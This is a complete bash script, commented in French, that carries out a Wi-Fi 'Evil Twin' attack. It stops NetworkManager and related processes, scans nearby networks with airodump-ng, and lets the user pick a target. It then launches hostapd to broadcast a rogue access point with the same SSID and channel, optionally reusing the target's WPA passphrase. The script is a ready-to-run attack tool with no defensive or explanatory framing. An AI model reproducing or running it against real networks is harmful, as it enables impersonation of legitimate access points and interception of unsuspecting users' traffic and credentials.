#!/bin/bash

IFACE="wlp61s0"
SCAN_PREFIX="scan"
SCAN_FILE="${SCAN_PREFIX}-01.csv"

function restore_network() {
    echo "[*] Remise de l'interface $IFACE en mode managed..."
    sudo ip link set "$IFACE" down
    sudo iwconfig "$IFACE" mode managed
    sudo ip link set "$IFACE" up
    echo "[*] Relance de NetworkManager..."
    sudo systemctl start NetworkManager
}

# Kill des processus gênants
echo "[*] Killing interfering processes..."
sudo killall avahi-daemon NetworkManager wpa_supplicant 2>/dev/null || true

# Passage en mode managed pour scanner proprement
echo "[*] Remise en mode managed pour scan..."
sudo ip link set "$IFACE" down
sudo iwconfig "$IFACE" mode managed
sudo ip link set "$IFACE" up

# Nettoyage anciens fichiers
rm -f ${SCAN_PREFIX}-*.csv ${SCAN_PREFIX}-*.cap

# Scan Wi-Fi pendant 15 secondes
echo "[*] Scan Wi-Fi (15 secondes)..."
sudo timeout 15s airodump-ng --output-format csv --write "$SCAN_PREFIX" "$IFACE" > /dev/null 2>&1

if [ ! -f "$SCAN_FILE" ]; then
    echo "[!] Scan échoué ou fichier $SCAN_FILE introuvable."
    restore_network
    exit 1
fi

# Affichage des réseaux détectés avec numérotation correcte à partir de 1
echo "[*] Réseaux détectés :"
awk -F, 'NR>1 && $1 != "BSSID" && length($14) > 0 {print NR-1 ") SSID: " $14 " | BSSID: " $1 " | Channel: " $4 " | Encryption: " $6}' "$SCAN_FILE" | tr -d '\r'

echo -ne "\nChoisis un numéro de réseau cible : "
read TARGET_NUM

TARGET_LINE=$(awk -F, 'NR>1 && $1 != "BSSID" && length($14) > 0 {print $1 ";" $4 ";" $14 ";" $6}' "$SCAN_FILE" | sed -n "${TARGET_NUM}p")

if [ -z "$TARGET_LINE" ]; then
    echo "[!] Numéro invalide."
    restore_network
    exit 1
fi

BSSID=$(echo "$TARGET_LINE" | cut -d';' -f1 | xargs)
CHANNEL=$(echo "$TARGET_LINE" | cut -d';' -f2 | xargs)
SSID=$(echo "$TARGET_LINE" | cut -d';' -f3 | xargs)
ENCRYPTION=$(echo "$TARGET_LINE" | cut -d';' -f4 | xargs)

echo -e "\n[*] Cible choisie :"
echo "SSID: $SSID"
echo "BSSID: $BSSID"
echo "Channel: $CHANNEL"
echo "Encryption: $ENCRYPTION"

# Si le réseau est WPA ou WPA2, demande la clé
if echo "$ENCRYPTION" | grep -qi "WPA"; then
    echo "Ce réseau est sécurisé avec WPA/WPA2. Entre la clé : "
    read -s KEY
    echo
fi

# Stop NetworkManager et wpa_supplicant pour éviter conflit
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant 2>/dev/null || true

# Configurer l'interface sur le bon canal
sudo ip link set "$IFACE" down
sleep 1
sudo iwconfig "$IFACE" channel "$CHANNEL"
sudo ip link set "$IFACE" up

# Générer un fichier hostapd.conf temporaire
HOSTAPD_CONF=$(mktemp)
cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Ajouter la clé si WPA/WPA2
if [ -n "$KEY" ]; then
    cat >> "$HOSTAPD_CONF" <<EOF
wpa=2
wpa_passphrase=$KEY
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
fi

echo "[*] Démarrage de hostapd avec SSID '$SSID' sur canal $CHANNEL..."
sudo hostapd "$HOSTAPD_CONF" &

HOSTAPD_PID=$!

echo "[*] Evil Twin lancé. Appuie sur [Entrée] pour arrêter."
read

echo "[*] Arrêt de hostapd..."
sudo kill $HOSTAPD_PID
wait $HOSTAPD_PID 2>/dev/null

# Nettoyer
rm -f "$HOSTAPD_CONF"

restore_network

echo "[*] Script terminé, réseau restauré."
